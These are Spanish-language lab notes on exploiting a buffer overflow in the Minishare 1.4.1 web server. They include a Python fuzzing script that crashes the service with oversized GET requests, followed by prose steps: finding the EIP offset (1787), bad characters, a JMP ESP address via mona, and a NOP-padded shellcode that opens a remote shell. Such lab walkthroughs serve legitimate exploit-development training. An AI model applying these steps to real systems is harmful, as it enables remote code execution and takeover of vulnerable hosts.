> Minishare 1.4.1
- Descargamos en windows
- Te monta un servicio http por el puerto 80

## Fuzzing
```python
#!/usr/bin/python3

from struct import pack
import sys, socket

# Variables globales
ip_address = '192.168.111.45'
port = 80

def exploit():
	total_length = 200
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(7)
		
		s.connect((ip_address, port))
		
		print("\n[+] Enviando %d bytes" % total_length)
		
		s.send(b"GET " + b"\x41"*total_length + b" HTTP/1.1\r\n\r\n")
		s.recv(1024)
		s.close()
		
		total_length += 100
	
	except:
		print("\n[!] El servicio al parecer se ha corrompido")
		print("\n[+] El servicio ha crasheado con un total de  %d bytes enviados" % total_length)
		sys.exit(1)

if __name__ == '__main__':
	exploit()
```

- Utilizamos la utilidad de metasploit 
	- `pattern-create.rb -l 2000`
- creamos un payload y mandamos eso en vez de las As

- Con la utilidad `pattern_offset.rb -q EIP` para reconocer el patron averiguamos especificamente cuantos varchar hay que poner de basura.

- En este caso 1787 caracteres antes de corromper
	- `offset = 1787`

- Creamos un after_eip para ver adonde carga lo que sobra
- Creamos un bytearray para chequear que badchars tiene este programa
	- \x0d y \x00 son los unicos que parecen malos

- Debemos averiguar cual es la direccion del jump
- En este caso no encontro ningun pointer con FFE4
	- `!mona help findwild`
	- `!mona findwild -s "JMP ESP"`

- Copiamos una direccion cualquiera que no contenga badchars y ejecutamos de nuevo
- Creamos el shellcode para inyectar codigo malicioso y hay que acordarse de agregar bytes \x90 para darle un espacio.
- Debemos colocar una consola en escucha y ya tendremos acceso.

